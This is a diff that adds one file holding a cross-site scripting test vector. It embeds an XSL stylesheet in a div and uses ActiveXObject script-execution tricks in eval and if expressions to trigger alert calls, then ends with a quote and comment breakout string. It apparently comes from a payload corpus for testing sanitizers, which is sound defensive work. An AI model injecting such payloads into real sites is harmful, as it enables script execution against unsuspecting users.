@@ -1,0 +1,7 @@
+<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
+<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
+<template match="/">
+<eval>new ActiveXObject('htmlfile').parentWindow.alert(135)</eval>
+<if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if>
+</template>
+</stylesheet>//["'`-->]]>]</div>
